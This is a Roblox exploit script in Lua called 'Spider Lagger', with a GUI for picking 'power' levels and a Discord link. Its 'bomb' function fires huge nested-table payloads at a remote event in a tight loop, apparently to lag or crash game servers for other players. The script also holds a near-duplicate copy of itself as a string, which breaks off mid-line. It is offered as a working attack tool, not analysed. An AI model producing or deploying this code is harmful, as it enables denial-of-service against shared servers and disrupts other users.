--// SPIDER LAGGER - PODERES AUMENTADOS (MID=50, HIGH=100, ULTRA=140, MEGA=180)
--// Fundo: aranha ID 83588180830854 | Botão "Copiar Script" incluso
--// Discord: https://discord.com/channels/1528914579843977497/1531377016195121333

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local ConfigFile = "SpiderLaggerConfig.json"

-- ⚙️ PODERES ATUALIZADOS
local NIVELES = {
    Low     = { poder = 23 },
    Mid     = { poder = 50 },   -- aumentado
    High    = { poder = 100 },  -- aumentado
    Ultra   = { poder = 140 },  -- aumentado
    Mega    = { poder = 180 }   -- aumentado
}

-- 🔑 TECLA PREDETERMINADA: M
local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local ventanaBloqueada = false

-- 🎨 CONFIGURAÇÕES VISUAIS
local UI_CONFIG = {
    ButtonInact  = Color3.fromRGB(40, 40, 40),
    ButtonLow    = Color3.fromRGB(0, 255, 0),
    ButtonMid    = Color3.fromRGB(255, 255, 0),
    ButtonHigh   = Color3.fromRGB(255, 0, 0),
    ButtonUltra  = Color3.fromRGB(200, 150, 255),
    ButtonMega   = Color3.fromRGB(255, 50, 50),
    ToggleOff    = Color3.fromRGB(45, 45, 45),
    Font         = Enum.Font.GothamBlack,
    BorderColor  = Color3.fromRGB(40, 40, 40),
    PurpleText   = Color3.fromRGB(200, 150, 255),
    MegaText     = Color3.fromRGB(255, 100, 100),
}

-- 💾 CONFIG
local function SaveConfig()
    local data = { Nivel = nivelActual, Bloqueado = ventanaBloqueada }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            nivelActual = data.Nivel or "Low"
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

-- ⚡ LAG ENGINE (mais forte ainda)
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(25000, poder * 70)  -- limite aumentado para 25000
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

-- 🧩 ELEMENTOS
local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, btnUltra, btnMega, lockButton
local titleLabel, textLagger, keybindButton, toggleClick, shadowLabel, shadowGradient
local tryhardText, discordButton, discordText, copyButton

-- FUNÇÕES DE ATUALIZAÇÃO
local function actualizarBotonesNivel()
    local function setBtn(btn, active, activeColor, inactiveColor, activeTextColor)
        if active then
            btn.BackgroundColor3 = activeColor
            btn.TextColor3 = activeTextColor or Color3.fromRGB(0,0,0)
            btn.BorderSizePixel = 0
        else
            btn.BackgroundColor3 = inactiveColor or UI_CONFIG.ButtonInact
            btn.TextColor3 = Color3.fromRGB(200,200,220)
            btn.BorderSizePixel = 1
            btn.BorderColor3 = UI_CONFIG.BorderColor
        end
    end
    setBtn(btnLow,   nivelActual=="Low",   UI_CONFIG.ButtonLow)
    setBtn(btnMid,   nivelActual=="Mid",   UI_CONFIG.ButtonMid)
    setBtn(btnHigh,  nivelActual=="High",  UI_CONFIG.ButtonHigh)
    setBtn(btnUltra, nivelActual=="Ultra", UI_CONFIG.ButtonUltra, nil, Color3.fromRGB(255,255,255))
    setBtn(btnMega,  nivelActual=="Mega",  UI_CONFIG.ButtonMega,  nil, Color3.fromRGB(255,255,255))
    tryhardText.Visible = (nivelActual=="Ultra" or nivelActual=="Mega")
    if nivelActual=="Mega" then
        tryhardText.Text = "🔥 MEGA LAG ACTIVATED!"
        tryhardText.TextColor3 = UI_CONFIG.MegaText
    elseif nivelActual=="Ultra" then
        tryhardText.Text = "Only for tryhards"
        tryhardText.TextColor3 = UI_CONFIG.PurpleText
    else
        tryhardText.Visible = false
    end
end

local function actualizarSwitch()
    toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
    toggleBall.Position = laggerActive and UDim2.new(1,-18,0.5,-9) or UDim2.new(0,3,0.5,-9)
    toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
    toggleClick.TextColor3 = laggerActive and Color3.fromRGB(0,255,0) or Color3.fromRGB(255,0,0)
end

local function actualizarCandado()
    lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
    lockButton.TextColor3 = ventanaBloqueada and Color3.fromRGB(200,200,220) or Color3.fromRGB(150,150,170)
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name:gsub("Button","")
        keybindButton.Text = "KEY: " .. display
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    actualizarSwitch()
    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.10)  -- delay reduzido para 0.10s
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- 🖼️ INTERFACE
if CoreGui:FindFirstChild("SpiderLagger_UI") then CoreGui.SpiderLagger_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SpiderLagger_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- PAINEL PRINCIPAL (FUNDO BRANCO + IMAGEM ARANHA)
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(0,0,0)
mainFrame.Size = UDim2.new(0, 240, 0, 110)
mainFrame.Position = UDim2.new(0.12, 0, 0.5, -55)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

-- IMAGEM DE FUNDO (ARANHA)
local bgImage = Instance.new("ImageLabel", mainFrame)
bgImage.BackgroundTransparency = 1
bgImage.Size = UDim2.new(1,0,1,0)
bgImage.Position = UDim2.new(0,0,0,0)
bgImage.Image = "rbxassetid://83588180830854"
bgImage.ZIndex = 0
bgImage.ScaleType = Enum.ScaleType.Crop

-- ⭐ ESTRELAS
local stars = {}
for i = 1, 35 do
    local star = Instance.new("Frame", mainFrame)
    star.BackgroundColor3 = Color3.fromRGB(200,200,220)
    star.BorderSizePixel = 0
    star.Size = UDim2.new(0, 1+math.random()*2, 0, 1+math.random()*2)
    star.Position = UDim2.new(math.random(),0, math.random(),0)
    star.ZIndex = 1
    star.BackgroundTransparency = 0.2+math.random()*0.5
    local corner = Instance.new("UICorner", star); corner.CornerRadius = UDim.new(1,0)
    table.insert(stars, { frame=star, transparency=star.BackgroundTransparency, timer=2+math.random()*2, elapsed=0 })
end

task.spawn(function()
    while true do
        for _, s in ipairs(stars) do
            s.elapsed = s.elapsed + 0.1
            if s.elapsed >= s.timer then
                s.elapsed = 0
                s.timer = 2+math.random()*2
                local star = s.frame
                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), { BackgroundTransparency = 1 }):Play()
                task.wait(0.2)
                star.Position = UDim2.new(math.random(),0, math.random(),0)
                local ns = 1+math.random()*2
                star.Size = UDim2.new(0, ns, 0, ns)
                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), { BackgroundTransparency = s.transparency }):Play()
            end
        end
        task.wait(0.1)
    end
end)

-- TÍTULO
titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0,3,0,0)
titleLabel.Size = UDim2.new(0,140,0,22)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "Spider Lagger"
titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
titleLabel.TextSize = 16
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 3

shadowLabel = Instance.new("TextLabel", mainFrame)
shadowLabel.BackgroundTransparency = 1
shadowLabel.Position = UDim2.new(0,3,0,0)
shadowLabel.Size = UDim2.new(0,140,0,22)
shadowLabel.Font = Enum.Font.GothamBlack
shadowLabel.Text = "Spider Lagger"
shadowLabel.TextSize = 16
shadowLabel.TextXAlignment = Enum.TextXAlignment.Left
shadowLabel.TextYAlignment = Enum.TextYAlignment.Center
shadowLabel.ZIndex = 4
shadowLabel.ClipsDescendants = true
shadowLabel.TextTransparency = 0
shadowLabel.TextColor3 = Color3.fromRGB(200,200,220)

shadowGradient = Instance.new("UIGradient", shadowLabel)
shadowGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(180,180,200)),
    ColorSequenceKeypoint.new(0.2, Color3.fromRGB(210,210,230)),
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(240,240,255)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(210,210,230)),
    ColorSequenceKeypoint.new(0.8, Color3.fromRGB(180,180,200)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(160,160,180))
})
task.spawn(function()
    while true do
        for i=0,1,0.006 do shadowGradient.Offset = Vector2.new(i,0) task.wait(0.025) end
    end
end)

-- "Only for tryhards" / "MEGA LAG ACTIVATED"
tryhardText = Instance.new("TextLabel", mainFrame)
tryhardText.BackgroundTransparency = 1
tryhardText.Position = UDim2.new(0,5,0,98)
tryhardText.Size = UDim2.new(0,140,0,10)
tryhardText.Font = Enum.Font.GothamBlack
tryhardText.Text = ""
tryhardText.TextColor3 = UI_CONFIG.PurpleText
tryhardText.TextSize = 8
tryhardText.TextXAlignment = Enum.TextXAlignment.Left
tryhardText.TextYAlignment = Enum.TextYAlignment.Center
tryhardText.ZIndex = 2
tryhardText.Visible = false

-- BOTÕES KEY e LOCK
keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = Color3.fromRGB(25,25,30)
keybindButton.BackgroundTransparency = 0.1
keybindButton.Position = UDim2.new(1,-62,0,1)
keybindButton.Size = UDim2.new(0,34,0,12)
keybindButton.Font = Enum.Font.GothamBlack
keybindButton.Text = "KEY: M"
keybindButton.TextColor3 = Color3.fromRGB(200,200,220)
keybindButton.TextSize = 6
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 2
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0,5)
actualizarKeybindButton()

lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundColor3 = Color3.fromRGB(25,25,30)
lockButton.BackgroundTransparency = 0.1
lockButton.Position = UDim2.new(1,-28,0,1)
lockButton.Size = UDim2.new(0,26,0,12)
lockButton.Font = Enum.Font.GothamBlack
lockButton.TextSize = 6
lockButton.TextColor3 = Color3.fromRGB(200,200,220)
lockButton.AutoButtonColor = false
lockButton.ZIndex = 2
Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0,5)
lockButton.MouseButton1Click:Connect(function() ventanaBloqueada = not ventanaBloqueada actualizarCandado() SaveConfig() end)
actualizarCandado()

-- "LAGGER"
textLagger = Instance.new("TextLabel", mainFrame)
textLagger.BackgroundTransparency = 1
textLagger.Position = UDim2.new(0,5,0,26)
textLagger.Size = UDim2.new(0,65,0,18)
textLagger.Font = Enum.Font.GothamBlack
textLagger.Text = "LAGGER"
textLagger.TextColor3 = Color3.fromRGB(0,0,0)
textLagger.TextSize = 11
textLagger.TextXAlignment = Enum.TextXAlignment.Left
textLagger.TextYAlignment = Enum.TextYAlignment.Center
textLagger.ZIndex = 2

-- SWITCH
toggleContainer = Instance.new("Frame", mainFrame)
toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleContainer.Position = UDim2.new(1,-52,0,26)
toggleContainer.Size = UDim2.new(0,44,0,18)
toggleContainer.ZIndex = 2
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)

toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleBall.Size = UDim2.new(0,16,0,16)
toggleBall.Position = UDim2.new(0,2,0.5,-8)
toggleBall.ZIndex = 2
Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)

toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 0
toggleClick.BackgroundColor3 = Color3.fromRGB(45,45,45)
toggleClick.Size = UDim2.new(1,0,1,0)
toggleClick.ZIndex = 3
toggleClick.Font = Enum.Font.GothamBlack
toggleClick.Text = "INACTIVE"
toggleClick.TextSize = 6
toggleClick.TextColor3 = Color3.fromRGB(255,0,0)
toggleClick.TextXAlignment = Enum.TextXAlignment.Center
toggleClick.TextYAlignment = Enum.TextYAlignment.Center
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false
Instance.new("UICorner", toggleClick).CornerRadius = UDim.new(1,0)
actualizarSwitch()

-- SELETOR DE TECLA
keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "KEY: ..."
    keybindButton.BackgroundColor3 = Color3.fromRGB(200,0,0)
    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput then return end
    if gp then return end
    local newKey = input.KeyCode
    if newKey and newKey ~= Enum.KeyCode.Unknown then
        keybind = newKey
        actualizarKeybindButton()
        listeningForInput = false
        keybindButton.BackgroundColor3 = Color3.fromRGB(25,25,30)
        keybindButton.BackgroundTransparency = 0.1
        keybindButton.TextColor3 = Color3.fromRGB(200,200,220)
    end
end)

-- BOTÕES LOW/MID/HIGH/ULTRA/MEGA
local btnY = 48
local btnW = 40
local btnH = 18
local esp = 2
local mg = 3

btnLow = Instance.new("TextButton", mainFrame)
btnLow.Size = UDim2.new(0,btnW,0,btnH)
btnLow.Position = UDim2.new(0,mg,0,btnY)
btnLow.Font = UI_CONFIG.Font
btnLow.Text = "LOW"
btnLow.TextColor3 = Color3.fromRGB(200,200,220)
btnLow.TextSize = 7
btnLow.AutoButtonColor = false
btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
btnLow.BorderSizePixel = 1
btnLow.BorderColor3 = UI_CONFIG.BorderColor
btnLow.ZIndex = 2
Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0,6)
btnLow.MouseButton1Click:Connect(function() nivelActual="Low" actualizarBotonesNivel() SaveConfig() end)

btnMid = Instance.new("TextButton", mainFrame)
btnMid.Size = UDim2.new(0,btnW,0,btnH)
btnMid.Position = UDim2.new(0,mg+btnW+esp,0,btnY)
btnMid.Font = UI_CONFIG.Font
btnMid.Text = "MID"
btnMid.TextColor3 = Color3.fromRGB(200,200,220)
btnMid.TextSize = 7
btnMid.AutoButtonColor = false
btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
btnMid.BorderSizePixel = 1
btnMid.BorderColor3 = UI_CONFIG.BorderColor
btnMid.ZIndex = 2
Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0,6)
btnMid.MouseButton1Click:Connect(function() nivelActual="Mid" actualizarBotonesNivel() SaveConfig() end)

btnHigh = Instance.new("TextButton", mainFrame)
btnHigh.Size = UDim2.new(0,btnW,0,btnH)
btnHigh.Position = UDim2.new(0,mg+(btnW+esp)*2,0,btnY)
btnHigh.Font = UI_CONFIG.Font
btnHigh.Text = "HIGH"
btnHigh.TextColor3 = Color3.fromRGB(200,200,220)
btnHigh.TextSize = 7
btnHigh.AutoButtonColor = false
btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
btnHigh.BorderSizePixel = 1
btnHigh.BorderColor3 = UI_CONFIG.BorderColor
btnHigh.ZIndex = 2
Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0,6)
btnHigh.MouseButton1Click:Connect(function() nivelActual="High" actualizarBotonesNivel() SaveConfig() end)

btnUltra = Instance.new("TextButton", mainFrame)
btnUltra.Size = UDim2.new(0,btnW,0,btnH)
btnUltra.Position = UDim2.new(0,mg+(btnW+esp)*3,0,btnY)
btnUltra.Font = UI_CONFIG.Font
btnUltra.Text = "ULTRA"
btnUltra.TextColor3 = Color3.fromRGB(200,200,220)
btnUltra.TextSize = 6
btnUltra.AutoButtonColor = false
btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
btnUltra.BorderSizePixel = 1
btnUltra.BorderColor3 = UI_CONFIG.BorderColor
btnUltra.ZIndex = 2
Instance.new("UICorner", btnUltra).CornerRadius = UDim.new(0,6)
btnUltra.MouseButton1Click:Connect(function() nivelActual="Ultra" actualizarBotonesNivel() SaveConfig() end)

btnMega = Instance.new("TextButton", mainFrame)
btnMega.Size = UDim2.new(0,btnW,0,btnH)
btnMega.Position = UDim2.new(0,mg+(btnW+esp)*4,0,btnY)
btnMega.Font = UI_CONFIG.Font
btnMega.Text = "MEGA"
btnMega.TextColor3 = Color3.fromRGB(200,200,220)
btnMega.TextSize = 6
btnMega.AutoButtonColor = false
btnMega.BackgroundColor3 = UI_CONFIG.ButtonInact
btnMega.BorderSizePixel = 1
btnMega.BorderColor3 = UI_CONFIG.BorderColor
btnMega.ZIndex = 2
Instance.new("UICorner", btnMega).CornerRadius = UDim.new(0,6)
btnMega.MouseButton1Click:Connect(function() nivelActual="Mega" actualizarBotonesNivel() SaveConfig() end)

actualizarBotonesNivel()

-- BOTÃO DISCORD (com imagem)
local discordLink = "https://discord.com/channels/1528914579843977497/1531377016195121333"
discordButton = Instance.new("ImageButton", mainFrame)
discordButton.BackgroundTransparency = 1
discordButton.Image = "rbxassetid://83588180830854"
discordButton.Size = UDim2.new(0,70,0,14)
discordButton.Position = UDim2.new(0,130,0,92)
discordButton.ZIndex = 2
discordButton.AutoButtonColor = false

discordText = Instance.new("TextLabel", discordButton)
discordText.BackgroundTransparency = 1
discordText.Size = UDim2.new(1,0,1,0)
discordText.Font = Enum.Font.GothamBlack
discordText.Text = "discord"
discordText.TextColor3 = Color3.fromRGB(0,0,0)
discordText.TextSize = 8
discordText.TextXAlignment = Enum.TextXAlignment.Center
discordText.TextYAlignment = Enum.TextYAlignment.Center
discordText.ZIndex = 3

discordButton.MouseButton1Click:Connect(function()
    local success = pcall(function()
        if setclipboard then setclipboard(discordLink)
        elseif toclipboard then toclipboard(discordLink) end
    end)
    if success then
        local old = discordText.TextColor3
        discordText.TextColor3 = Color3.fromRGB(0,255,0)
        task.wait(0.3)
        discordText.TextColor3 = old
    end
end)

-- BOTÃO "📋 COPIAR SCRIPT"
copyButton = Instance.new("TextButton", mainFrame)
copyButton.BackgroundColor3 = Color3.fromRGB(30,30,40)
copyButton.BackgroundTransparency = 0.1
copyButton.Size = UDim2.new(0, 55, 0, 12)
copyButton.Position = UDim2.new(1, -60, 0, 94)
copyButton.Font = Enum.Font.GothamBlack
copyButton.Text = "📋 Copiar"
copyButton.TextColor3 = Color3.fromRGB(255,255,255)
copyButton.TextSize = 6
copyButton.AutoButtonColor = false
copyButton.ZIndex = 2
Instance.new("UICorner", copyButton).CornerRadius = UDim.new(0,4)

-- O script completo para copiar (igual a este)
local fullScript = [==[
--// SPIDER LAGGER - PODERES AUMENTADOS (MID=50, HIGH=100, ULTRA=140, MEGA=180)
--// Fundo: aranha ID 83588180830854 | Botão "Copiar Script" incluso
--// Discord: https://discord.com/channels/1528914579843977497/1531377016195121333

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local ConfigFile = "SpiderLaggerConfig.json"

-- ⚙️ PODERES ATUALIZADOS
local NIVELES = {
    Low     = { poder = 23 },
    Mid     = { poder = 50 },
    High    = { poder = 100 },
    Ultra   = { poder = 140 },
    Mega    = { poder = 180 }
}

-- 🔑 TECLA PREDETERMINADA: M
local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local ventanaBloqueada = false

-- 🎨 CONFIGURAÇÕES VISUAIS
local UI_CONFIG = {
    ButtonInact  = Color3.fromRGB(40, 40, 40),
    ButtonLow    = Color3.fromRGB(0, 255, 0),
    ButtonMid    = Color3.fromRGB(255, 255, 0),
    ButtonHigh   = Color3.fromRGB(255, 0, 0),
    ButtonUltra  = Color3.fromRGB(200, 150, 255),
    ButtonMega   = Color3.fromRGB(255, 50, 50),
    ToggleOff    = Color3.fromRGB(45, 45, 45),
    Font         = Enum.Font.GothamBlack,
    BorderColor  = Color3.fromRGB(40, 40, 40),
    PurpleText   = Color3.fromRGB(200, 150, 255),
    MegaText     = Color3.fromRGB(255, 100, 100),
}

-- 💾 CONFIG
local function SaveConfig()
    local data = { Nivel = nivelActual, Bloqueado = ventanaBloqueada }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            nivelActual = data.Nivel or "Low"
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

-- ⚡ LAG ENGINE
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(25000, poder * 70)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

-- 🧩 ELEMENTOS
local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, btnUltra, btnMega, lockButton
local titleLabel, textLagger, keybindButton, toggleClick, shadowLabel, shadowGradient
local tryhardText, discordButton, discordText, copyButton

-- FUNÇÕES DE ATUALIZAÇÃO
local function actualizarBotonesNivel()
    local function setBtn(btn, active, activeColor, inactiveColor, activeTextColor)
        if active then
            btn.BackgroundColor3 = activeColor
            btn.TextColor3 = activeTextColor or Color3.fromRGB(0,0,0)
            btn.BorderSizePixel = 0
        else
            btn.BackgroundColor3 = inactiveColor or UI_CONFIG.ButtonInact
            btn.TextColor3 = Color3.fromRGB(200,200,220)
            btn.BorderSizePixel = 1
            btn.BorderColor3 = UI_CONFIG.BorderColor
        end
    end
    setBtn(btnLow,   nivelActual=="Low",   UI_CONFIG.ButtonLow)
    setBtn(btnMid,   nivelActual=="Mid",   UI_CONFIG.ButtonMid)
    setBtn(btnHigh,  nivelActual=="High",  UI_CONFIG.ButtonHigh)
    setBtn(btnUltra, nivelActual=="Ultra", UI_CONFIG.ButtonUltra, nil, Color3.fromRGB(255,255,255))
    setBtn(btnMega,  nivelActual=="Mega",  UI_CONFIG.ButtonMega,  nil, Color3.fromRGB(255,255,255))
    tryhardText.Visible = (nivelActual=="Ultra" or nivelActual=="Mega")
    if nivelActual=="Mega" then
        tryhardText.Text = "🔥 MEGA LAG ACTIVATED!"
        tryhardText.TextColor3 = UI_CONFIG.MegaText
    elseif nivelActual=="Ultra" then
        tryhardText.Text = "Only for tryhards"
        tryhardText.TextColor3 = UI_CONFIG.PurpleText
    else
        tryhardText.Visible = false
    end
end

local function actualizarSwitch()
    toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
    toggleBall.Position = laggerActive and UDim2.new(1,-18,0.5,-9) or UDim2.new(0,3,0.5,-9)
    toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
    toggleClick.TextColor3 = laggerActive and Color3.fromRGB(0,255,0) or Color3.fromRGB(255,0,0)
end

local function actualizarCandado()
    lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
    lockButton.TextColor3 = ventanaBloqueada and Color3.fromRGB(200,200,220) or Color3.fromRGB(150,150,170)
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name:gsub("Button","")
        keybindButton.Text = "KEY: " .. display
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    actualizarSwitch()
    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.10)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- 🖼️ INTERFACE
if CoreGui:FindFirstChild("SpiderLagger_UI") then CoreGui.SpiderLagger_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SpiderLagger_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- PAINEL PRINCIPAL
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(0,0,0)
mainFrame.Size = UDim2.new(0, 240, 0, 110)
mainFrame.Position = UDim2.new(0.12, 0, 0.5, -55)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

-- IMAGEM DE FUNDO (ARANHA)
local bgImage = Instance.new("ImageLabel", mainFrame)
bgImage.BackgroundTransparency = 1
bgImage.Size = UDim2.new(1,0,1,0)
bgImage.Position = UDim2.new(0,0,0,0)
bgImage.Image = "rbxassetid://83588180830854"
bgImage.ZIndex = 0
bgImage.ScaleType = Enum.ScaleType.Crop

-- ⭐ ESTRELAS
local stars = {}
for i = 1, 35 do
    local star = Instance.new("Frame", mainFrame)
    star.BackgroundColor3 = Color3.fromRGB(200,200,220)
    star.BorderSizePixel = 0
    star.Size = UDim2.new(0, 1+math.random()*2, 0, 1+math.random()*2)
    star.Position = UDim2.new(math.random(),0, math.random(),0)
    star.ZIndex = 1
    star.BackgroundTransparency = 0.2+math.random()*0.5
    local corner = Instance.new("UICorner", star); corner.CornerRadius = UDim.new(1,0)
    table.insert(stars, { frame=star, transparency=star.BackgroundTransparency, timer=2+math.random()*2, elapsed=0 })
end

task.spawn(function()
    while true do
        for _, s in ipairs(stars) do
            s.elapsed = s.elapsed + 0.1
            if s.elapsed >= s.timer then
                s.elapsed = 0
                s.timer = 2+math.random()*2
                local star = s.frame
                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), { BackgroundTransparency = 1 }):Play()
                task.wait(0.2)
                star.Position = UDim2.new(math.random(),0, math.random(),0)
                local ns = 1+math.random()*2
                star.Size = UDim2.new(0, ns, 0, ns)
                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), { BackgroundTransparency = s.transparency }):Play()
            end
        end
        task.wait(0.1)
    end
end)

-- TÍTULO
titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0,3,0,0)
titleLabel.Size = UDim2.new(0,140,0,22)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "Spider Lagger"
titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
titleLabel.TextSize = 16
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 3

shadowLabel = Instance.new("TextLabel", mainFrame)
shadowLabel.BackgroundTransparency = 1
shadowLabel.Position = UDim2.new(0,3,0,0)
shadowLabel.Size = UDim2.new(0,140,0,22)
shadowLabel.Font = Enum.Font.GothamBlack
shadowLabel.Text = "Spider Lagger"
shadowLabel.TextSize = 16
shadowLabel.TextXAlignment = Enum.TextXAlignment.Left
shadowLabel.TextYAlignment = Enum.TextYAlignment.Center
shadowLabel.ZIndex = 4
shadowLabel.ClipsDescendants = true
shadowLabel.TextTransparency = 0
shadowLabel.TextColor3 = Color3.fromRGB(200,200,220)

shadowGradient = Instance.new("UIGradient", shadowLabel)
shadowGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(180,180,200)),
    ColorSequenceKeypoint.new(0.2, Color3.fromRGB(210,210,230)),
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(240,240,255)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(210,210,230)),
    ColorSequenceKeypoint.new(0.8, Color3.fromRGB(180,180,200)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(160,160,180))
})
task.spawn(function()
    while true do
        for i=0,1,0.006 do shadowGradient.Offset = Vector2.new(i,0) task.wait(0.025) end
    end
end)

-- "Only for tryhards" / "MEGA LAG ACTIVATED"
tryhardText = Instance.new("TextLabel", mainFrame)
tryhardText.BackgroundTransparency = 1
tryhardText.Position = UDim2.new(0,5,0,98)
tryhardText.Size = UDim2.new(0,140,0,10)
tryhardText.Font = Enum.Font.GothamBlack
tryhardText.Text = ""
tryhardText.TextColor3 = UI_CONFIG.PurpleText
tryhardText.TextSize = 8
tryhardText.TextXAlignment = Enum.TextXAlignment.Left
tryhardText.TextYAlignment = Enum.TextYAlignment.Center
tryhardText.ZIndex = 2
tryhardText.Visible = false

-- KEY e LOCK
keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = Color3.fromRGB(25,25,30)
keybindButton.BackgroundTransparency = 0.1
keybindButton.Position = UDim2.new(1,-62,0,1)
keybindButton.Size = UDim2.new(0,34,0,12)
keybindButton.Font = Enum.Font.GothamBlack
keybindButton.Text = "KEY: M"
